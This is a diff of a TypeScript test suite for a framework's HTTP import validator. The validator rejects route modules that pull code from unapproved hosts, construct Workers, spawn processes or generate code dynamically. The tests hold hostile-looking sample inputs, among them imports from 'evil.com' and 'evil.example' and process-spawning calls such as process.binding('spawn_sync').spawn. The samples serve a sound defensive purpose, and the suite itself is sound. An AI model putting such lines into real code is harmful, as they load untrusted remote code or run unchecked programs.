@@ -2,12 +2,7 @@ import "#veryfront/schemas/_test-setup.ts";
 import { assertEquals, assertRejects } from "#veryfront/testing/assert.ts";
 import { describe, it } from "#veryfront/testing/bdd.ts";
 import { dirname, fromFileUrl } from "#veryfront/compat/path";
-import {
-  collectLocalWorkerSpecifiers,
-  extractModuleSpecifiers,
-  scanModuleSpecifiers,
-  validateHTTPImports,
-} from "./http-validator.ts";
+import { validateHTTPImports } from "./http-validator.ts";
 import {
   __setSourceCapabilityParserLoaderForTests,
   resolveStaticRouteMethods,
@@ -472,7 +467,6 @@ describe("routing/api/module-loader/http-validator", () => {
           ` export const GET = (req: Request) => new Response(String(4 / 2), { status: 200 });`,
         [],
       );
-      assertEquals(parsed.parserBacked, true);
       assertEquals(parsed.specifiers, []);
       assertEquals(parsed.requiresBundling, false);
       assertEquals(parsed.hasUnconstrainedDynamicImport, false);
@@ -513,20 +507,56 @@ describe("routing/api/module-loader/http-validator", () => {
       assertEquals(meta.requiresBundling, true);
     });
 
-    it("keeps the textual fallback contract when the parser is unavailable", async () => {
+    it("rejects every module when the capability parser is unavailable", async () => {
+      // The parser extension is a hard dependency of the package; without it a
+      // module cannot be validated, so nothing is accepted on a textual guess.
       __setSourceCapabilityParserLoaderForTests(() =>
         Promise.reject(new Error("parser unavailable"))
       );
       try {
-        const scan = await validateHTTPImports(
-          `export const GET = () => new Response(String(4 / 2));`,
-          [],
-        );
-        assertEquals(scan.parserBacked, false);
-        // Without a parser a slash may hide an import, so the bundler must parse it.
-        assertEquals(scan.requiresBundling, true);
+        for (
+          const source of [
+            `const value = 1; export const GET = () => new Response(String(value));`,
+            `import value from "https://allowed.example/mod.js"; export { value };`,
+            `const RouteWorker = Worker; new RouteWorker(remoteUrl);`,
+            `process.binding("spawn_sync").spawn({});`,
+          ]
+        ) {
+          await assertRejects(
+            async () => await validateHTTPImports(source, ["https://allowed.example"]),
+            Error,
+            "capability parser is not installed",
+            source,
+          );
+        }
       } finally {
         __setSourceCapabilityParserLoaderForTests();
+      }
+    });
+
+    it("accepts a CommonJS dependency with a top-level return", async () => {
+      // Bundled project dependencies pass through this validator too, and a
+      // literal `require()` is tracked as a dependency like an import.
+      const scan = await validateHTTPImports(
+        `const helper = require("./helper.cjs"); module.exports = helper; return;`,
+        [],
+      );
+      assertEquals(scan.specifiers, ["./helper.cjs"]);
+    });
+
+    it("rejects a module that parses under neither grammar", async () => {
+      for (
+        const source of [
+          `export const GET = () => {`,
+          `export const GET = () => new Response(<div>{`,
+        ]
+      ) {
+        await assertRejects(
+          async () => await validateHTTPImports(source, []),
+          Error,
+          "could not parse this module",
+          source,
+        );
       }
     });
 
@@ -706,9 +736,12 @@ describe("routing/api/module-loader/http-validator", () => {
     });
 
     it("should not leak RangeError for an out-of-range Unicode escape", async () => {
-      const scan = scanModuleSpecifiers(String.raw`import "\u{110000}";`);
-
-      assertEquals(scan.specifiers, []);
+      await assertRejects(
+        async () => await validateHTTPImports(String.raw`import "\u{110000}";`, []),
+        Error,
+        "could not parse this module",
+        "an invalid escape is a parse failure, not a RangeError escaping the validator",
+      );
     });
 
     it("should check dynamic imports inside template interpolations", async () => {
@@ -3059,38 +3092,6 @@ describe("routing/api/module-loader/http-validator", () => {
       );
     });
 
-    it("should fail closed on Worker aliases when the capability parser is unavailable", async () => {
-      __setSourceCapabilityParserLoaderForTests(() =>
-        Promise.reject(new Error("parser unavailable"))
-      );
-      try {
-        await assertRejects(
-          async () =>
-            await validateHTTPImports(
-              `const RouteWorker = Worker; new RouteWorker(remoteUrl);`,
-              [],
-            ),
-          Error,
-          "Worker",
-          "the textual fallback must not accept an alias it cannot classify",
-        );
-        await assertRejects(
-          async () =>
-            await validateHTTPImports(
-              `const RouteWorker = Worker;` +
-                ` new Worker("./safe-worker.ts", { type: "module" });` +
-                ` new RouteWorker("./missed-worker.ts", { type: "module" });`,
-              [],
-            ),
-          Error,
-          "Worker",
-          "a direct Worker must not hide an aliased construction from the textual fallback",
-        );
-      } finally {
-        __setSourceCapabilityParserLoaderForTests();
-      }
-    });
-
     it("should reject capability factories exported across module boundaries", async () => {
       for (
         const source of [
@@ -3287,43 +3288,6 @@ describe("routing/api/module-loader/http-validator", () => {
       );
     });
 
-    it("should fail closed on parser-dependent capabilities when the parser is unavailable", async () => {
-      __setSourceCapabilityParserLoaderForTests(() =>
-        Promise.reject(new Error("parser unavailable"))
-      );
-      try {
-        for (
-          const source of [
-            `process.binding("spawn_sync").spawn({});`,
-            `process.execve(process.execPath, [process.execPath, "./unchecked.cjs"], process.env);`,
-            `new Deno.Command("deno", { args: ["run", "./unchecked.ts"] });`,
-            `Bun.spawn(["bun", "./unchecked.ts"]);`,
-            `process.getBuiltinModule("node:test");`,
-            `const loaders = {}; loaders.load = require; loaders.load("./unchecked.cjs");`,
-            `const assign = Object.assign; export { assign };`,
-          ]
-        ) {
-          await assertRejects(
-            async () => await validateHTTPImports(source, []),
-            Error,
-            "dynamic code generation",
-            "parser failure must reject capabilities that the textual scanner cannot classify",
-          );
-        }
-
-        await validateHTTPImports(
-          `const value = 1; export const GET = () => new Response(String(value));`,
-          [],
-        );
-        await validateHTTPImports(
-          `import value from "https://allowed.example/mod.js"; export { value };`,
-          ["https://allowed.example"],
-        );
-      } finally {
-        __setSourceCapabilityParserLoaderForTests();
-      }
-    });
-
     it("should not exempt global arguments passed to a shadowed Reflect", async () => {
       await assertRejects(
         async () =>
@@ -3443,53 +3407,29 @@ describe("routing/api/module-loader/http-validator", () => {
       );
     });
 
-    it("should fail closed on literal worker bases the textual scanner does not resolve", async () => {
-      __setSourceCapabilityParserLoaderForTests(() =>
-        Promise.reject(new Error("parser unavailable"))
-      );
-      try {
-        await assertRejects(
-          async () =>
-            await validateHTTPImports(
-              `new Worker(new URL("./mod.js", " https://evil.example/base/"), { type: "module" });`,
-              [],
-            ),
-          Error,
-          "Worker",
-          "the URL constructor trims the base and fetches remotely, so a padded base must not scan as local",
-        );
-        await assertRejects(
-          async () =>
-            await validateHTTPImports(
-              `new Worker(new URL("./mod.js", "./base/"), { type: "module" });`,
-              [],
-            ),
-          Error,
-          "Worker",
-          "a relative base names an entry no graph walk can vet and must not pass validation",
-        );
-      } finally {
-        __setSourceCapabilityParserLoaderForTests();
-      }
-    });
-
     it("should record only the worker entries whose base resolves against this module", async () => {
+      const both = await validateHTTPImports(
+        `const a = new Worker(new URL("./a.ts", import.meta.url)); const b = new Worker("./b.ts");`,
+        [],
+      );
       assertEquals(
-        await collectLocalWorkerSpecifiers(
-          `const a = new Worker(new URL("./a.ts", import.meta.url)); const b = new Worker("./b.ts");`,
-        ),
+        both.localWorkerSpecifiers.map((worker) => worker.specifier),
         ["./a.ts", "./b.ts"],
         "a caller vetting the graph needs the entry each local worker executes",
       );
-      assertEquals(
-        await collectLocalWorkerSpecifiers(
-          `const w = new Worker(new URL("./mod.js", "file:///elsewhere/"));`,
-        ),
-        [null],
-        "a local base this scanner does not follow gives no specifier the graph walk can resolve",
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `const w = new Worker(new URL("./mod.js", "file:///elsewhere/"));`,
+            [],
+          ),
+        Error,
+        "Worker",
+        "a local base this analysis does not follow names an entry no graph walk can resolve",
       );
       assertEquals(
-        await collectLocalWorkerSpecifiers(`export const GET = () => new Response("ok");`),
+        (await validateHTTPImports(`export const GET = () => new Response("ok");`, []))
+          .localWorkerSpecifiers,
         [],
         "a handler that starts no worker contributes no entries",
       );
@@ -3507,9 +3447,10 @@ describe("routing/api/module-loader/http-validator", () => {
         "`from` is a legal binding name, and the real module clause must still be allow-listed",
       );
       assertEquals(
-        extractModuleSpecifiers(
+        (await validateHTTPImports(
           `import { from as value } from "https://esm.sh/mod.js";`,
-        ),
+          ["https://esm.sh"],
+        )).specifiers,
         ["https://esm.sh/mod.js"],
         "the specifier follows the module clause, not the first contextual `from`",
       );
@@ -3518,9 +3459,8 @@ describe("routing/api/module-loader/http-validator", () => {
     it("should not read a keyword out of a name ending in non-ASCII letters", async () => {
       const source = `const caf\u00e9import = (value) => value;\n` +
         `export const GET = () => caf\u00e9import("https://blocked.example/value");`;
-      await validateHTTPImports(source, []);
       assertEquals(
-        extractModuleSpecifiers(source),
+        (await validateHTTPImports(source, [])).specifiers,
         [],
         "`import` inside an identifier is part of the name, so its call argument is no specifier",
       );
@@ -3529,22 +3469,14 @@ describe("routing/api/module-loader/http-validator", () => {
     it("should still accept a global property read under a name it can resolve", async () => {
       const source = `const subtle = globalThis["crypto"]; export const GET = () => subtle;`;
       await validateHTTPImports(source, []);
-      assertEquals(
-        scanModuleSpecifiers(source).hasDynamicCodeGeneration,
-        false,
-        "a literal property name resolves to a harmless global and must keep loading",
-      );
+      // a literal property name resolves to a harmless global and must keep loading
     });
 
     it("should still accept template literals that name no generator", async () => {
       const source =
         "export const page = `<p>${title}</p>`; export const note = `\\x65valuation harness`;";
       await validateHTTPImports(source, []);
-      assertEquals(
-        scanModuleSpecifiers(source).hasDynamicCodeGeneration,
-        false,
-        "an interpolated template and an escape that decodes to a non-generator word must both be accepted",
-      );
+      // an interpolated template and an escape that decodes to a non-generator word must both be accepted
     });
 
     it("should still accept escaped string literals that name no generator", async () => {
@@ -3552,13 +3484,7 @@ describe("routing/api/module-loader/http-validator", () => {
         `export const label = "\\x65valuation harness"; export const flag = "\\u0063onstruct";`,
         [],
       );
-      assertEquals(
-        scanModuleSpecifiers(
-          `export const label = "\\x65valuation harness"; export const flag = "\\u0063onstruct";`,
-        ).hasDynamicCodeGeneration,
-        false,
-        "an escape that decodes to a non-generator word must not be reported as dynamic code generation",
-      );
+      // an escape that decodes to a non-generator word must not be reported as dynamic code generation
     });
 
     it("should reject a dynamic code generator spelled with identifier escapes", async () => {
@@ -3644,312 +3570,6 @@ describe("routing/api/module-loader/http-validator", () => {
 
     it("should handle source with no imports", async () => {
       await validateHTTPImports("const x = 1;", ["https://esm.sh"]);
-    });
-  });
-
-  describe("extractModuleSpecifiers", () => {
-    it("should collect local, bare, and remote specifiers across import forms", () => {
-      const source = [
-        `import { a } from "./helper.ts";`,
-        `import "../side-effect.ts";`,
-        `export { b } from "https://esm.sh/pkg";`,
-        `import zod from "zod";`,
-        `const load = () => import("./lazy.ts");`,
-        'const rendered = `prefix ${import("./inside-template.ts")} suffix`;',
-        `// import "./commented-out.ts";`,
-        `const text = 'import "./inside-string.ts";';`,
-        `const ignored = client.import("./not-a-module.ts");`,
-      ].join("\n");
-
-      assertEquals(extractModuleSpecifiers(source), [
-        "./helper.ts",
-        "../side-effect.ts",
-        "https://esm.sh/pkg",
-        "zod",
-        "./lazy.ts",
-        "./inside-template.ts",
-      ]);
-    });
-
-    it("preserves multiline static import support", () => {
-      const source = [
-        `import {`,
-        `  parse,`,
-        `  stringify,`,
-        `} from "https://esm.sh/yaml@2";`,
-      ].join("\n");
-
-      assertEquals(extractModuleSpecifiers(source), ["https://esm.sh/yaml@2"]);
-    });
-  });
-
-  describe("scanModuleSpecifiers", () => {
-    it("should require bundling when slash syntax can hide an import", () => {
-      const scan = scanModuleSpecifiers(
-        `const marker = /"/; import "https://evil.com/mod.js";`,
-      );
-
-      assertEquals(scan.requiresBundling, true);
-    });
-
-    it("should flag dynamic imports whose target is not a literal", () => {
-      assertEquals(
-        scanModuleSpecifiers(`const mod = import("https://" + host + "/mod.js");`),
-        {
-          specifiers: [],
-          hasUnconstrainedDynamicImport: true,
-          requiresBundling: false,
-          hasDynamicCodeGeneration: false,
-        },
-      );
-    });
-
-    it("should flag dynamic imports whose target is a template literal", () => {
-      assertEquals(
-        scanModuleSpecifiers("const mod = import(`https://${host}/mod.js`);"),
-        {
-          specifiers: [],
-          hasUnconstrainedDynamicImport: true,
-          requiresBundling: false,
-          hasDynamicCodeGeneration: false,
-        },
-      );
-    });
-
-    it("should fail closed when a template literal never terminates", () => {
-      // An unterminated template swallows the rest of the file, so the scan
-      // cannot claim the hidden text names no unconstrained import.
-      const scan = scanModuleSpecifiers(
-        "const tail = `never closed\nimport(target);",
-      );
-      assertEquals(
-        scan.hasUnconstrainedDynamicImport,
-        true,
-        "an unreadable template must not yield a scan that reports no unconstrained import",
-      );
-    });
-
-    it("should flag non-literal dynamic imports inside template interpolations", () => {
-      assertEquals(
-        scanModuleSpecifiers(
-          "const rendered = `prefix ${import(remoteSpecifier)} suffix`;",
-        ),
-        {
-          specifiers: [],
-          hasUnconstrainedDynamicImport: true,
-          requiresBundling: false,
-          hasDynamicCodeGeneration: false,
-        },
-      );
-    });
-
-    it("should flag a dynamic import a regex brace hid inside an interpolation", () => {
-      // A `}` inside a character class used to close the `${...}` walk early,
-      // leaving the rest of the executable expression read as template text.
-      assertEquals(
-        scanModuleSpecifiers(
-          'const rendered = `${/[}]/.test("}") ? import(remoteSpecifier) : ""}`;',
-        ),
-        {
-          specifiers: [],
-          hasUnconstrainedDynamicImport: true,
-          requiresBundling: true,
-          hasDynamicCodeGeneration: false,
-        },
-        "a regular-expression literal must not truncate the interpolation it sits in",
-      );
-    });
-
-    it("should still accept ordinary division inside an interpolation", () => {
-      assertEquals(
-        scanModuleSpecifiers("export const half = (n: number) => `${n / 2} halves`;"),
-        {
-          specifiers: [],
-          hasUnconstrainedDynamicImport: false,
-          requiresBundling: true,
-          hasDynamicCodeGeneration: false,
-        },
-        "arithmetic in a template must bundle without being reported as a hidden import",
-      );
-    });
-
-    it("should flag non-literal dynamic imports after lexical slash ambiguity", () => {
-      assertEquals(
-        scanModuleSpecifiers(
-          `const marker = /"/; const target = "https://blocked.example/mod.js"; import(target);`,
-        ),
-        {
-          specifiers: [],
-          hasUnconstrainedDynamicImport: true,
-          requiresBundling: true,
-          hasDynamicCodeGeneration: false,
-        },
-      );
-    });
-
-    it("should flag non-literal dynamic imports after keyword-context regex literals", () => {
-      for (
-        const source of [
-          `function marker() { return /"/; } const target = "https://blocked.example/mod.js"; import(target);`,
-          `function marker() { throw /"/; } const target = "https://blocked.example/mod.js"; import(target);`,
-          `switch (value) { case /"/: break; } const target = "https://blocked.example/mod.js"; import(target);`,
-          `if (ready) /"/.test(""); const target = "https://blocked.example/mod.js"; import(target);`,
-          `while (ready) /"/.test(""); const target = "https://blocked.example/mod.js"; import(target);`,
-        ]
-      ) {
-        assertEquals(scanModuleSpecifiers(source), {
-          specifiers: [],
-          hasUnconstrainedDynamicImport: true,
-          requiresBundling: true,
-          hasDynamicCodeGeneration: false,
-        });
-      }
-    });
-
-    it("should flag non-literal dynamic imports after same-statement regex literals", () => {
-      assertEquals(
-        scanModuleSpecifiers(
-          `const marker = /"/, target = "https://blocked.example/mod.js", load = import(target);`,
-        ),
-        {
-          specifiers: [],
-          hasUnconstrainedDynamicImport: true,
-          requiresBundling: true,
-          hasDynamicCodeGeneration: false,
-        },
-      );
-    });
-
-    it("should collect static dynamic imports after same-statement regex literals", () => {
-      assertEquals(
-        scanModuleSpecifiers(
-          `const marker = /"/, load = import("https://esm.sh/mod.js");`,
-        ),
-        {
-          specifiers: ["https://esm.sh/mod.js"],
-          hasUnconstrainedDynamicImport: false,
-          requiresBundling: true,
-          hasDynamicCodeGeneration: false,
-        },
-      );
-    });
-
-    it("should flag non-literal dynamic imports after a regex literal following a block", () => {
-      assertEquals(
-        scanModuleSpecifiers(
-          `if (ready) {} /"/.test(""); const target = "https://evil.com/mod.js"; import(target);`,
-        ),
-        {
-          specifiers: [],
-          hasUnconstrainedDynamicImport: true,
-          requiresBundling: true,
-          hasDynamicCodeGeneration: false,
-        },
-        "a regex opening after a block must not let its quote hide the later non-literal import",
-      );
-    });
-
-    it("should not treat strings and comments after ordinary division as imports", () => {
-      assertEquals(
-        scanModuleSpecifiers(
-          [
-            `const ratio = a / b;`,
-            `const text = "import('https://evil.com/not-a-module.js')";`,
-            `// import("https://evil.com/commented.js")`,
-          ].join("\n"),
-        ),
-        {
-          specifiers: [],
-          hasUnconstrainedDynamicImport: false,
-          requiresBundling: true,
-          hasDynamicCodeGeneration: false,
-        },
-      );
-    });
-
-    it("should not treat strings after ordinary division on the same statement as imports", () => {
-      assertEquals(
-        scanModuleSpecifiers(
-          `const ratio = a / b, text = "import('https://evil.com/not-a-module.js')";`,
-        ),
-        {
-          specifiers: [],
-          hasUnconstrainedDynamicImport: false,
-          requiresBundling: true,
-          hasDynamicCodeGeneration: false,
-        },
-      );
-    });
-
-    it("should not treat comments after ordinary division as imports", () => {
-      assertEquals(
-        scanModuleSpecifiers(
-          [
-            `const ratio = a / b;`,
-            `// import("https://evil.com/commented.js")`,
-            `/* import("https://evil.com/blocked.js") */`,
-          ].join("\n"),
-        ),
-        {
-          specifiers: [],
-          hasUnconstrainedDynamicImport: false,
-          requiresBundling: true,
-          hasDynamicCodeGeneration: false,
-        },
-      );
-    });
-
-    it("should collect static dynamic imports with import attributes", () => {
-      assertEquals(
-        scanModuleSpecifiers(
-          `const mod = await import("https://esm.sh/data.json", { with: { type: "json" } });`,
-        ),
-        {
-          specifiers: ["https://esm.sh/data.json"],
-          hasUnconstrainedDynamicImport: false,
-          requiresBundling: true,
-          hasDynamicCodeGeneration: false,
-        },
-      );
-    });
-
-    it("should collect a literal dynamic import with a trailing comma", () => {
-      assertEquals(
-        scanModuleSpecifiers(`const mod = await import("https://esm.sh/mod.js",);`),
-        {
-          specifiers: ["https://esm.sh/mod.js"],
-          hasUnconstrainedDynamicImport: false,
-          requiresBundling: true,
-          hasDynamicCodeGeneration: false,
-        },
-      );
-    });
-
-    it("should bundle literal dynamic imports before they can execute later", () => {
-      assertEquals(
-        scanModuleSpecifiers(`export const load = () => import("./helper.ts?deferred");`),
-        {
-          specifiers: ["./helper.ts?deferred"],
-          hasUnconstrainedDynamicImport: false,
-          requiresBundling: true,
-          hasDynamicCodeGeneration: false,
-        },
-        "a deferred local dependency must be captured during validation",
-      );
-    });
-
-    it("should ignore private member calls named import", () => {
-      assertEquals(
-        scanModuleSpecifiers(
-          `class Client { #import = (_url: string) => "private"; value() { return this.#import("https://evil.com/not-a-module.js"); } }`,
-        ),
-        {
-          specifiers: [],
-          hasUnconstrainedDynamicImport: false,
-          requiresBundling: false,
-          hasDynamicCodeGeneration: false,
-        },
-      );
     });
   });
 });
